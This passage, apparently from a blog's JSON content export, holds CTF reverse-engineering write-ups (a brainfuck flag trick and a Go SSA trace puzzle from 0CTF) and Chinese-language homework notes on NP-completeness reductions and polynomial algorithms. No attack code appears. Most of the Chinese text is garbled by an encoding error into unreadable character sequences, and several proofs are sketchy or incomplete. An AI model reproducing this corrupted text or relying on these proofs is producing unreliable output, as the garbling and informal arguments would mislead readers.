gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,[.,] Itâ€™s not so hard to find out that this brainfuck code will decode the flag in binary, and there is a loop [.,] to implement echo in the end. This part is trap, the brainfuck code [+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+] is equivalent to: while( *char )&#123; ++*char;&#125;char += 1;while( *char )&#123; ++*char;&#125;char += 1;...so on It set the chars in flag to 0, remove it to get the flag. DensityIt just use some rule to expand the original input(with random string), then encoded them with base 64. Left or Right?There were so much Rust reverseing challenge recentlyâ€¦I am still too slow to analyze such program. They are not so hard ãƒ»ã‚œãƒ»(PĞ”&#96;qï½¡)ãƒ» ã‚œãƒ» Blame on my wisdom teeth.","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"ASIS","slug":"ASIS","permalink":"http://blog.terrynini.tw/tags/ASIS/"}]},{"title":"2018::0CTF-Quals::g0g0g0","slug":"2018-0CTF-Quals-g0g0g0","date":"2018-05-02T03:35:44.000Z","updated":"2018-05-27T06:54:27.000Z","comments":true,"path":"en/2018-0CTF-Quals-g0g0g0/","permalink":"http://blog.terrynini.tw/en/2018-0CTF-Quals-g0g0g0/","excerpt":"Hadding a headache, I did not spent so much time on 0CTF, which always has some fun problem to solve.","text":"Hadding a headache, I did not spent so much time on 0CTF, which always has some fun problem to solve. This problem give you a trace.log (download file) It looks like: Entering main.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = fmt.init()Entering fmt.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = strconv.init()Entering strconv.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = math.init()Entering math.init..0: t0 = *init$guard This is a trace log of a program, which should be written in Golang.But the trace.log looks like some LLVM IR, rather than trace generated by go tool trace. It seems like trace.log is too large to analyze, but actually this is a simple program. You can slim the trace.log by deleting some library function. //delete initEntering main.init. ...15584 linesLeaving main.init.//and some input and ouput functionEntering fmt.Println at /usr/local/Cellar/go/1.9.2/libexec/src/fmt/print.go:256:6.Leaving fmt.Println, resuming main.main at /tmp/gogo.go:192:16. Now, we can start to analyze the trace of program.The trace is easy to read, but there are some weird IR : t15 = phi [1: t8, 6: t8, 4: t14] This is actually call the Phi node, since LLVM uses SSA (Static Single Assignment),which means that every variable can only be assigned once.Then,what if I wrote this program: a = 1;if (v &lt; 10) a = 2;b = a; We assign a value to a twice!So, it actually has more than one a. a1 = 1; //block 0if (v &lt; 10) a2 = 2; //block 1b = PHI(a1, a2); //block 3 The IR of line 4 is : b = phi [0:a1, 1:a2] You can understand the trace.log now.The program implement big number by array, and also some function for multipling, adding big num, finally we can derive a equation from it: $$(x+y)(x+z)xâˆ’10(x+y)(x+z)(y+z)+(x+y)(y+z)y+(x+z)(y+z)z&#x3D;0$$ It seems to be simple, but it actually is a elliptic curveâ€¦ PS. The trace.log is actually generated by ssadump","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"}]},{"title":"Advance-Algorithm::homework7","slug":"Advance-Algorithm-homework7","date":"2018-01-15T03:23:37.000Z","updated":"2020-07-05T12:47:51.000Z","comments":true,"path":"tw/Advance-Algorithm-homework7/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework7/","excerpt":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚æ„Ÿæ©å½¬æ™ºè®šå˜†å½¬æ™º","text":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚æ„Ÿæ©å½¬æ™ºè®šå˜†å½¬æ™º é¡Œä¸€ Show that the class $P$, viewed as a set of languages is closed under union, intersection, concatenation, complement and Kleene star. That is, if $L1, L2 \\in P$, then, $L1 \\cup L2 \\in P$,etc. page 4 - Problem 2-a Kleene star é¡ŒäºŒ Show that if the decision version of the Hamiltonian cycle is polynomial-time solvable then so is the problem of finding a Hamiltonian cycle. é¡Œç›®ï¼šif Decision Hamiltonian Cycle(DHC) $\\in P\\rightarrow$ Finding Hamiltonian Cycle(FHC) $\\in P$ å‡è¨­ç¾åœ¨æœ‰ä¸€å€‹æ¼”ç®—æ³•HamCycle(G)å¯ä»¥åœ¨Pæ™‚é–“å…§è§£æ‰DHCï¼Œå‰‡æˆ‘å€‘å¯ä»¥å»ºæ§‹ä»¥ä¸‹æ¼”ç®—æ³•åœ¨ç¢ºå®šæ€§Pæ™‚é–“å…§è§£æ‰FHC(è­‰æ˜ï¼šé€£çµè£¡é¢æœ‰) 123456789101112131415161718HCVertices(G) H = [] next â† 0 // åˆå§‹å€¼ä¸é‡è¦ choose a starting node v while G has unchecked edges do if HamCycle(G) then // è©¦è‘—ä¸€å€‹å€‹æ‹”æ‰é€£åœ¨vä¸Šçš„é‚Š // å¦‚æœæœ‰ä¸€å€‹é‚Šeè¢«æ‹¿æ‰å¾Œï¼Œæ–°çš„åœ–å°±ä¸å­˜åœ¨HCï¼Œé‚£eå°±æ˜¯HCçš„ä¸€éƒ¨åˆ† for all edges e = (v,u) on v do G&#x27; â† G âˆ’ e if HamCycle(G&#x27;) then G = G&#x27; else add v to H mark e as checked next â† u v â† next return H å•é¡Œè®Šè½‰(Problem Reduction) åª½æˆ‘æ‰¾åˆ°ç­”æ¡ˆäº† è£¡é¢çš„problem 1 é¡Œä¸‰ Show that the class $NP$, viewed as a set of languages is closed under union, intersection, concatenation and Kleene star. é¡ä¼¼1. é¡Œå›› Prove that P $\\subseteq$ NP$\\cap$ co-NP and if NP$\\ne$ co-NP,then P$\\ne $NP. $P \\subseteq (NP \\ \\cap \\ coNP) \\rightarrow P \\subseteq NP, P \\subseteq coNP$so if $P &#x3D; NP \\\\\\rightarrow NP \\subseteq (NP \\ \\cap \\ coNP) \\\\\\rightarrow NP \\subseteq coNP \\ åˆ \\ size(NP)&#x3D;size(coNP) \\\\\\rightarrow NP &#x3D; coNP$ $\\because P \\Rightarrow Q$ ç­‰åƒ¹æ–¼ $\\bar Q \\Rightarrow \\bar P$$\\therefore$ if $NP \\neq coNP$, then $P \\neq NP$ é¡Œäº” Show that 2-CNF-SAT is polynomial time solvable. CNF : conjunctive normal formï¼Œæ•¸ä½é›»è·¯ä¸­çš„product of sumï¼Œä¾‹ï¼š$(A \\lor B) \\land (C \\lor D)$ stackoverflowæ¼”ç®—æ³•ç­†è¨˜ â†‘é€™å€‹æ–¹æ³•å¤ªç¥å•¦ å¤ªå±Œè¾£ é¡Œå…­ The subgraph isomorphism problem takes two graphs $G1$ and $G2$ and asks whether $G1$ is isomorphic to a subgraph of $G2$. Show that this problem is NP-complete. Cheggæ¨™æº–è§£ç­” Subgraph Isomorphism Problem Input :graph $G_1$, $G_2$ Output:$G_1$ æ˜¯å¦èˆ‡ $G_2$ çš„å…¶ä¸­ä¸€å€‹ subgraph åŒæ§‹ è­‰æ˜ Clique Problem $\\propto$ Subgraph Isomorphism Problem(ä»¥ä¸‹ç°¡ç¨±CPã€SIP) å·²çŸ¥ CP $\\in$ NPC Input :graph $S$, int $k$ Output:$S$ æ˜¯å¦å­˜åœ¨ä¸€å€‹ $k$-vertice çš„å®Œå…¨å­åœ– è¼¸å…¥è®Šè½‰ï¼š SIPçš„è¼¸å…¥ $G_1 &#x3D; k$-cliqueï¼š$O(N^2)$ SIPçš„è¼¸å…¥ $G_2 &#x3D; S$ï¼š$O(N^2)$ å› ç‚ºCP(S,k) = SIP(k-clique,S) æ‰€ä»¥ CP $\\propto$ SIP $\\rightarrow$ SIP $\\in$ NP-hard åˆ SIP $\\in$ NPï¼ˆç°¡å–®å¯«å€‹NPæ¼”ç®—æ³•å°±çŸ¥é“äº†ï¼‰ SIP $\\in$ NPC é¡Œä¸ƒ Given an integer m-by-n matrix $A$, and an integer m-vector $b$, the integer programming problem asks whether there is an integer n-vector $x$ such that $Ax \\leq b$. Prove that this problem is NP-complete. Integer Programming Problem Input :m*n matrix $A$, m-vector $b$ Output:æ˜¯å¦å­˜åœ¨ä¸€ n-vector $x$ ä½¿å¾— $Ax \\leq b$ è­‰æ˜ SAT $\\propto$ Integer Programming Problem (IPP) å·²çŸ¥ SAT $\\in$ NPC Input :CNFå¸ƒæ—å‡½å¼ $E(x) &#x3D; C_1 \\land C_2 \\land â€¦ \\land C_k$ , $x &#x3D; { x_1,â€¦,x_n}$ å¦‚ $C_1 &#x3D; \\lnot x_1 + x_3 + x_7$ Output:æ˜¯å¦å­˜åœ¨ä¸€çµ„è¼¸å…¥ç•¶ä½œ $x$ ä½¿å¾— $E(x) &#x3D; True$ è®Šè½‰ï¼š IPPçš„è¼¸å…¥$A &#x3D; \\begin{bmatrix}a_{11} &amp; a_{12} &amp; â€¦ &amp; a_{1n} \\\\ â€¦ &amp; â€¦ &amp; â€¦ &amp; â€¦ \\\\ a_{m1} &amp; a_{m2} &amp; â€¦ &amp; a_{mn} \\\\ \\end{bmatrix}$, $b &#x3D; \\begin{bmatrix}b_1 \\\\ â€¦ \\\\ b_m \\\\ \\end{bmatrix}$, å…¶ä¸­å„åˆ— $a_i*b$ å°æ‡‰åˆ° $C_i$ å¦‚ï¼š$C_1$ å°æ‡‰ $(1-x_1)+x_3+x_7 \\geq 1 \\\\ \\rightarrow -x_1+x_3+x_7 \\geq 0 \\\\ \\rightarrow x_1-x_3-x_7 \\leq 0 \\\\ \\rightarrow a_1 &#x3D; {1,0,-1,0,0,0,-1,â€¦}, b_1&#x3D;0$ IPPçš„è¼¸å‡ºæ”¹ç‚ºï¼šæ˜¯å¦å­˜åœ¨ä¸€ n-vector $x&#x3D;{0,1}$ ä½¿å¾— $ A_x \\leq b$ï¼Œ0 å°æ‡‰ $False$ï¼Œ1 å°æ‡‰ $True$ å› ç‚ºSAT(E) = IPP(A,b) æ‰€ä»¥ SAT $\\propto$ IPP $\\rightarrow$ IPP $\\in$ NP-hard åˆ IPP $\\in$ NPï¼ˆç°¡å–®å¯«å€‹NPæ¼”ç®—æ³•å°±çŸ¥é“äº†ï¼‰ IPP $\\in$ NPC é¡Œå…« Given a set $S$ of integers, determine whether there exists a subset $A \\subseteq S$, such that $\\sum_{x\\in A}x &#x3D; \\sum_{x\\in S-A} x$. Show this problem is NP-complete. Problem 1 Partition Problem Input :set $S$ Output:æ˜¯å¦å­˜åœ¨ $S_1, S_2 \\in S, S_1 \\cap S_2 &#x3D; \\varnothing$ s.t. $\\sum S_1 &#x3D; \\sum S_2$ è­‰æ˜ Subset Sum Problem $\\propto$ Partition Problem(ä»¥ä¸‹ç°¡ç¨±SSPã€PP) å·²çŸ¥ SSP $\\in$ NPC Input :set $S$, int $k$ Output:æ˜¯å¦å­˜åœ¨ $Sâ€™ \\in S$ s.t. $\\sum Sâ€™ &#x3D; k$ è®Šè½‰ï¼š PPçš„è¼¸å…¥ $X &#x3D; S \\cup {s-2k}$, $s &#x3D; \\sum S$ å› ç‚ºSSP(S,k) = PP(X) è‹¥å·¦å‰‡å³ï¼šè‹¥SSP(S,k)æˆç«‹ï¼Œä»£è¡¨$S$ä¸­æœ‰subset $Sâ€™$ åŠ ç¸½ç‚º $k$ï¼Œå‰‡åœ¨PP(X)ä¸­å°±å¯ä»¥å°‡ $X$ åˆ†ç‚º $Sâ€™\\cup {s-2k}$ å’Œå‰©ä¸‹çš„ä¸€åŠï¼ŒåŠ ç¸½çš†ç‚º $s-k$ è‹¥å³å‰‡å·¦ï¼šè‹¥PP(X)æˆç«‹ï¼Œä»£è¡¨äº’æ–¥å­é›† $S_1, S_2$ åŠ ç¸½çš†ç‚º $s-k$ï¼Œä¸”å¿…å®šå…¶ä¸­ä¸€é‚Šå«æœ‰ $s-2k$ï¼Œå°‡å…¶å»é™¤å¾Œï¼Œè©²é›†åˆ $Sâ€™$ åŠ ç¸½ç‚º $k$ ä¸” $Sâ€™ \\in S$ æ‰€ä»¥ SSP $\\propto$ PP $\\rightarrow$ PP $\\in$ NP-hard åˆ PP $\\in$ NPï¼ˆç°¡å–®å¯«å€‹NPæ¼”ç®—æ³•å°±çŸ¥é“äº†ï¼‰ PP $\\in$ NPC é¡Œä¹ An undirected graph $G$ is k-colorable, if we can color $V(G)$ using at most $k$ colors such that for each edge $xy$ in $E(G)$, its two end vertices are $x$ and $y$ are colored with different colors. Let k-COLOR denote the problem of determine whether $G$ is k-colorable. Show that k-COLOR is NP-complete for any constant $k \\geq 3$. 3SAT $\\propto$ 3è‘—è‰² $\\propto$ kè‘—è‰² k Coloring Problem Input :graph $G$, int k , $k &gt; 2$ Output:æ˜¯å¦å­˜åœ¨ä¸€ç¨®æœ€å¤šä½¿ç”¨kè‰²çš„è‘—è‰²æ–¹å¼ï¼Œä½¿Gä¸Šç›¸é„°çš„vertexé¡è‰²çš†ä¸åŒ 3 Coloring Problem Input :graph $G$ Output:æ˜¯å¦å­˜åœ¨ä¸€ç¨®æœ€å¤šä½¿ç”¨3è‰²çš„è‘—è‰²æ–¹å¼ï¼Œä½¿Gä¸Šç›¸é„°çš„vertexé¡è‰²çš†ä¸åŒ è­‰æ˜ 3SAT $\\propto$ 3 Coloring Problem(ä»¥ä¸‹ç°¡ç¨±3SATã€3CP) å·²çŸ¥ 3SAT $\\in$ NPC Input : formula $\\phi$variables Set $X$, clauses set $C$ é  çªç„¶ä¸æœƒè¨‚è¼¸å…¥ Output : æ˜¯å¦èƒ½æŒ‡å®š$X$ä¸€çµ„å¸ƒæ—å€¼ä½¿$C$ä¸­çš„å­å¥çš†ç‚ºçœŸ è®Šè½‰ï¼š 3CPçš„è¼¸å…¥G &#x3D; $G_{\\phi}$ ç¸½ä¹‹ä»–æŠŠåœ–æ§‹æˆé¡ä¼¼é›»è·¯åœ–çš„æ¨£å­ ç„¶å¾Œå¦‚æœè¦è­‰æ˜ 3è‘—è‰² $\\propto$ kè‘—è‰²å…¶å¯¦éå¸¸ç°¡å–®ï¼Œä»¥å››è‰²ç‚ºä¾‹ï¼š å››è‰²çš„è¼¸å…¥ç‚ºï¼šæˆ‘å€‘åªè¦åœ¨ä¸‰è‰²åœ–ä¸Šé¢æ–°å¢ä¸€å€‹é»ï¼Œä¸¦ä¸”é€™å€‹é»è·Ÿå…¶ä»–æ‰€æœ‰çš„é»éƒ½æœ‰é‚Š å››è‰²çš„è¼¸å‡ºç‚ºï¼šæ˜¯å¦å­˜åœ¨ä¸€ç¨®è‘—è‰²æ–¹æ³•ï¼Œåªç”¨å››è‰²å°±å¯ä»¥ç•«é€™å¼µåœ–å‡è¨­åŸåœ–å¯ä»¥ç”¨3è‰²è‘—è‰²ï¼Œé‚£å‰›æ‰å¤šåŠ çš„é‚£å€‹é»ï¼Œä¸€å®šæœƒéœ€è¦ç”¨åˆ°ç¬¬å››è‰²ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥çŸ¥é“ï¼Œè¦è®Šè½‰åˆ°kè‰²è‘—è‰²ï¼Œåªè¦å¹«3è‰²åœ–çš„è¼¸å…¥åŠ ä¸Šk-3å€‹é»ï¼Œä¸”é€™å¹¾å€‹æ–°å¢çš„é»åˆ°æ¯é»éƒ½è¦æœ‰é‚Šï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥è­‰æ˜ 3è‘—è‰² $\\propto$ kè‘—è‰²äº†ã€‚ https://www.clear.rice.edu/comp487/3sat-to-3col.pdfhttps://cgi.csc.liv.ac.uk/~igor/COMP309/3CP.pdf é¡Œå Show that the path cover problem is NP-complete. Path Cover Problem Input :graph $Gâ€™$, int k Output:æ˜¯å¦å­˜åœ¨ä¸€å€‹pathçš„é›†åˆ $S$, $|S|&lt;k$, s.t. æ‰€æœ‰é»éƒ½åœ¨ $S$ çš„ä»»æ„å…ƒç´ (è·¯å¾‘)ä¸Š è­‰æ˜ Hamiltonian Cycle Problem $\\propto$ Path Cover Problem(ä»¥ä¸‹ç°¡ç¨±HCPã€PCP) å·²çŸ¥ HCP $\\in$ NPC Input :graph $G$ Output:æ˜¯å¦å­˜åœ¨ä¸€cycle $c$ s.t. æ‰€æœ‰é»éƒ½æ°åœ¨ $c$ ä¸Šå‡ºç¾ä¸€æ¬¡ è®Šè½‰ï¼š PCPçš„è¼¸å…¥ $Gâ€™ &#x3D;$ åœ¨åŸåœ– $G$ ä¸Šæ‰¾ä¸€å€‹é‚Š$(u,v)$ï¼Œä¸¦åœ¨ $u$ ä¸Šæ¥ä¸Šä¸€å€‹æ–°çš„é» $uâ€™$ï¼Œåœ¨ $v$ ä¸Šæ¥ä¸Šä¸€å€‹æ–°çš„é» $vâ€™$ï¼Œå½¢æˆçš„æ–°åœ–ç•¶ä½œ$Gâ€™$ PCPçš„è¼¸å…¥ $k &#x3D; 1$ æ‰€ä»¥ HCP $\\propto$ PCP $\\rightarrow$ PCP $\\in$ NP-hard åˆ PCP $\\in$ NPï¼ˆç°¡å–®å¯«å€‹NPæ¼”ç®—æ³•å°±çŸ¥é“äº†ï¼‰ PCP $\\in$ NPC é¡Œåä¸€ List all NP-complete problems (and give proofs) that appear in Ex.1~6. Determine whether each of the following problems is polynomial time solvable or NP-complete. æ‡‰è©²ä¸æœƒè€ƒå§éš”å¤©è¦è€ƒå°±æ²’å¯«äº†ç³»åˆ— å‘µå‘µ é¡ŒåäºŒ Given a set $S$ of $n$ real numbers, another real number $M$, and an integer $k$, we want to determine whether or not there exist $k$ elements in $S$ whose sum is exactly $M$. é€™å€‹å¥½è­‰ï¼Œè·Ÿå‰é¢é¡ä¼¼ é¡Œåä¸‰ We are given an integer $k$ and $n$ objects which have to be placed in bins of equal capacity $M$. Object $i, 1 \\leq i \\leq n$, requires mi units of capacity. The objective is to determine whether $k$ bins are enough to accommodate all $n$ objects. No object may be placed partly in one bin and partly in another. é€™ä¹Ÿå¥½è­‰ é¡Œåå›› Given an undirecter graph $G$ and a number $k$ :a) Is there a cycle of length $\\geq$ k?b) Is there a cycle of length $\\leq$ k?c) Is there a spanning tree with each node of degree $\\leq$ 3? æ‡‰è©²é‚„å¯ä»¥","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework6","slug":"Advance-Algorithm-homework6","date":"2018-01-15T03:23:31.000Z","updated":"2020-07-05T12:36:32.000Z","comments":true,"path":"tw/Advance-Algorithm-homework6/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework6/","excerpt":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚","text":"å»ºè­°å¦‚æœçœ‹ä¸æ‡‚ç®—æ³•çš„è©±å¯ä»¥æ‹¿èµ·ç´™ç­†æ“ä½œï¼Œå› ç‚ºæˆ‘æœ‰é»æ‡¶ä¸æƒ³è¦ç•«åœ–ã€‚ é¡Œä¸€ Show that LCD$\\leq$ LIS and LCS$\\leq$ LIS. Does this result imply that there exist $O(n logn)$ algorithms for LCD and LCS? (Here $n$ represents the input length.) LCS &#x3D; Longest Common SubsequenceLCD &#x3D; Longest Chain of Dominations (å¹³é¢ä¸Šä¸€ä¸²é»ï¼Œaæ”¯é…bæ”¯é…cæ”¯é…dï¼Œæ±‚é€™å€‹å¹³é¢æœ€é•·çš„æ”¯é…éŠæ˜¯å¤šé•·)LIS &#x3D; Longest Increasing Subsequence è‹¥Aæ”¯é…Bï¼Œè¡¨ç¤º$(X_A &gt; X_B) \\wedge (Y_A &gt; Y_B)$ï¼Œè¡¨ç¤ºä¸€å€‹LCDå…¶$x,y$åº§æ¨™å¿…ç‚ºå…©Increasing subsequenceï¼Œå› æ­¤å¯çŸ¥ LCD $\\leq$ LISã€‚ å¥½ é€™é¡Œå®šç¾©æœ‰é»è©­ç•°ï¼Œæ‰€ä»¥æˆ‘å€‘æœ€å¾Œç­†è¨˜çš„çµèªæ˜¯ ä½ åª½pass Morris åƒè€ƒè¬›ç¾©Unit7 é¡ŒäºŒ Given a set of points S in the plane, a subset of $S$ is called an anti-chain if the points of the subset can be arranged in an order such that the $x$ coordinates of the points in the order are increasing and their $y$ coordinates are decreasing. Design an algorithm to find an anti-chain with maximal size. çµ¦ä¸€å †é»ï¼Œé †åºä¸é‡è¦ï¼Œæ‰¾å‡ºxéå¢ä¸”yéæ¸›çš„æœ€é•·çµ„åˆã€‚ æŠŠé»ä¾ç…§yé™å†ªæ’åˆ—ï¼Œç„¶å¾Œåœ¨xä¸Šé¢æ‰¾LISå°±å¥½äº†ã€‚ é¡Œä¸‰ Show that any comparison-based algorithm needs $\\Omega(n log n)$ time to solve the following problem: Given n points in the 2D plane, construct a tree of minimum total length whose vertices are the given points and the edge length of an edge is the Euclidean distance between the two end points of the edge. Euclidean distanceï¼šå¹³é¢ä¸Šå…©é»é–“çš„ç›´ç·šè·é›¢å³ç‚ºé€™å…©é»çš„Euclidean distance åŸé¡Œç›®ï¼šåœ¨2Då¹³é¢ä¸Šçµ¦å®šnå€‹é»ï¼Œå»ºä¸€å€‹è·é›¢ï¼ˆæ¬Šé‡ï¼‰ç¸½å’Œæœ€å°çš„treeï¼Œtreeçš„å„é ‚é»å³ç‚º2Då¹³é¢ä¸Šçš„é»ï¼Œå…©é ‚é»é–“çš„é‚Šçš„è·é›¢ï¼ˆæ¬Šé‡ï¼‰å³ç‚ºé€™å…©çš„é»åœ¨å¹³é¢ä¸Šçš„ç›´ç·šè·é›¢ã€‚ ç›´æ¥å°‡å•é¡Œè½‰æˆã€Œæœ€å°ç”Ÿæˆæ¨¹ã€å°±å¯ä»¥ç”¨ Kruskalâ€™s algorithm è§£ ä½†ä½œæ¥­æ˜¯ï¼šShow that any comparison-based algorithm needs $\\Omega(nlogn)$ time to solve this problem åƒè€ƒwikiå§lol åˆ©ç”¨å•é¡Œè®Šè½‰çš„ç‰¹æ€§ï¼Œå› ç‚ºæ±ºç­–ç‰ˆEMSTå¯ä»¥è®Šè½‰ç‚ºæœ€ä½³åŒ–EMSTï¼Œæ±‚çš„æ±ºç­–ç‰ˆçš„ä¸‹ç•Œä¾¿å¯åŒæ™‚çŸ¥é“æœ€ä½³åŒ–EMSTçš„ä¸‹ç•Œ æ±ºç­–ç‰ˆ EMST ä¸‹ç•Œ ä¸ç®¡ é€ä»–æƒ¹QQ wikié€™ä¸‰å°å¿« é‚„è¦æ›´å¿«æ‘¸è±†æµ·é´‰è¤² é¡Œå›› Let $x_1, x_2, \\dots , x_n$ be n distinct points. Give an algorithm to calculate the polynomial $p(x)$ of degree n in standard form such that $p(x_i) &#x3D; 0$ for every $1 \\leq i \\leq n$. è¦æ±‚è¨­è¨ˆä¸€å€‹æ¼”ç®—æ³•å°‡$p(x)&#x3D;(x-x_1)(x-x_2)(x-x_3)\\dots(x-x_n)$å±•é–‹ç‚ºæ¨™æº–å¼ã€‚ é€™è£¡çš„å¤šé …å¼ç›¸ä¹˜ï¼Œå°±æ˜¯ä¿‚æ•¸åšconvolutionçš„é‹ç®—ï¼Œå¦‚æœå…©å¤šé …å¼å„æœ‰né …ï¼Œéœ€è¦èŠ±$O(n^2)$ï¼Œä½¿ç”¨å¿«é€Ÿå‚…ç«‹è‘‰æŠŠæ™‚é–“å£“è‡³$O(nlogn)$ã€‚ ä½†å¦‚æœé€é …åšFFTè¤‡é›œåº¦æœƒæ˜¯$\\sum_{i&#x3D;2}^{n-1}O(ilogi)&#x3D;O(n^2logn)$ï¼Œæ‰€ä»¥ç”¨åˆ†æ²»çš„æ–¹æ³•ï¼Œå°åˆ‡ä¸‹å»åšFFTã€‚ è¤‡é›œåº¦ï¼š$T(n) &#x3D; 2T(n&#x2F;2) + O(nlogn) â†’ O(nlog^2n)$ æ‘ºç©èˆ‡é›¢æ•£å‚…ç«‹è‘‰è½‰æ›FFTèˆ‡å¤šé …å¼ä¹˜æ³• é¡Œäº” Let $p(x)$ be a given polynomial of degree n in standard form, and let $x_1, x_2, â€¦ , x_n$ be n distinct numbers. Give an algorithm to calculate each $p(x_i)$ for $1 \\leq i \\leq n$. (Hint: use the fact that the division problem of polynomials can be solved in $O(n log n)$ time and the result of the previous problem.) $p(x) &#x3D; f(x)g(x) + r(x)$æƒ³è¾¦æ³•è®“ $f(x)g(x) &#x3D; 0$ï¼Œå°±æ˜¯ä½¿ç”¨å¤šé …å¼é™¤æ³•è®“å¼å­è®Šæˆï¼š$p(x) &#x3D; f(x)(x-x_i) + r(x)$ å¤šé …å¼é™¤æ³•è¤‡é›œåº¦ç‚º$O(nlogn)$å¦‚æœå°æ¯å€‹$x_i$éƒ½åˆ†é–‹è¨ˆç®—è¤‡é›œåº¦ç‚º$O(n)O(nlogn)&#x3D;O(n^2logn)$ ä½†æ ¹æ“šç¬¬å››é¡Œï¼Œæˆ‘å€‘èƒ½å¤ å…ˆä½¿ç”¨æˆ‘å€‘è¦æŸ¥è©¢çš„æ•¸åˆ— $&lt; x_1,x_2,x_3,\\dots , x_n &gt;$åšå‡ºä¸€å€‹å‡½å¼$q(x)$ï¼Œä½¿å¾—$q(x_i)&#x3D;0, for;1\\leq i\\leq n$ï¼Œåšå¤šé …å¼é™¤æ³•å¯å¾—$p(x) &#x3D; f(x)q(x) + r(x)$ å¦‚æ­¤ä¸€ä¾†ä¾¿å¯ç°¡åŒ–é‹ç®—ï¼š$p(x_i)&#x3D;f(x_i)\\times 0+r(x_i)&#x3D;r(x_i)$ ç°¡åŒ–é‹ç®—çš„æ™‚é–“è¤‡é›œåº¦ç‚º:$O(nlog^2n) + O(nlogn) &#x3D; O(nlog^2n)$ ç°¡åŒ–å¾Œçš„å¼å­ä¿è­‰æœƒæ¶ˆå»æœ€é«˜æ¬¡é …ï¼Œæœ¬ä¾†æ±‚å‡ºæœ€é«˜é …çš„æ‰€éœ€çš„å¿«é€Ÿå†ªæ™‚é–“è¤‡é›œåº¦ç‚º$O(logn)$ ä¹¾ æ‰€ä»¥é€™æ¨£åˆ°åº•æœƒä¸æœƒæ¯”è¼ƒå¿«éŒ¦æ–‡åˆ¥ææˆ‘ï¼² é¡Œå…­ Given $n$ pairs of points $(x_i, y_i)$ with $x_1, x_2, \\dots , x_n$ being distinct. Design an algorithm to find the coefficients of the unique polynomial of degree less than $n$ that passes through these $n$ points. å¦‚æœæœ‰nå€‹é»ï¼Œæˆ‘å€‘çŸ¥é“æˆ‘å€‘å¯ä»¥æ‰¾åˆ°ä¸€æ¢ç·šç©¿éé€™äº›é»ï¼Œä¸éï¼Œå¦‚æœé€™æ¢ç·šçš„æœ€é«˜æ¬¡æ–¹$\\leq n-1$ï¼Œé€™æ¢ç·šæ˜¯å”¯ä¸€çš„ï¼Œä¹Ÿå°±æ˜¯èªªæœ€é«˜æ¬¡æ–¹$\\leq n-1$çš„ç·šåªæœ‰ä¸€æ¢ï¼Œé¡Œç›®è¦æ±‚ä½ åšä¸€å€‹ç®—æ³•æŠŠé€™å€‹å¤šé …å¼çš„ä¿‚æ•¸éƒ½ç®—å‡ºä¾†ã€‚ æ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•ç„¶å¾Œç”¨ç¬¬4.é¡Œçš„æ–¹æ³•å¾—åˆ°çš„çµæœï¼Œç”¨å¾®åˆ†æ±‚å€¼ï¼Œçµ„åˆå‡ºæ‹‰æ ¼æœ—æ—¥å¤šé …å¼çš„ä¿‚æ•¸ã€‚ é€™æ¨£å±•é–‹å¥½åƒæœƒæœ‰å•é¡Œï¼Ÿé‚„æ²’æ±‚å‡º$x^n$çš„ä¿‚æ•¸? Nevilleâ€™s algorithm letï¼š$p_{i,j}(x)$ æœƒç©¿é point $i$~$j$ çš„å¤šé …å¼ initial conditionï¼š$p_{i,i}(x) &#x3D; y_i$ recurrence relationï¼š$p_{i,j}(x) &#x3D; \\frac{(x-x_j)p_{i,j-1}(x) - (x-x_i)p_{i+1,j}(x)}{(x_i-x_j)}$ è©²å”¯ä¸€å¤šé …å¼çš„è­‰æ˜ é¡Œä¸ƒ Given two images $A$ and $B$ with $B$ being the smaller one, where would we put $B$ on $A$, so that the overlapping part of $A$ and $B$ has the most likelihood? The difference between $A$ and $B$ is defined as the sum of the squares of the 